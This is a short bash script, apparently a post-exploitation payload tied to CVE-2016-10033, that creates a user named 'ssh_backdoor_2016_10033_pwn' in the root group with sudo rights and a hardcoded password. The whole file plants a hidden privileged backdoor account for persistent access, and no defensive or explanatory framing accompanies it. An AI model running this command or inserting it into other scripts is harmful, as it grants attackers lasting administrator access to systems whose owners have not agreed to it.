#!/usr/bin/env bash

/usr/sbin/useradd -rm -d /home/ssh_backdoor_2016_10033_pwn -s /bin/bash -g root -G sudo -p $(openssl passwd -1 'cve_2016_10033_pwnedpw') ssh_backdoor_2016_10033_pwn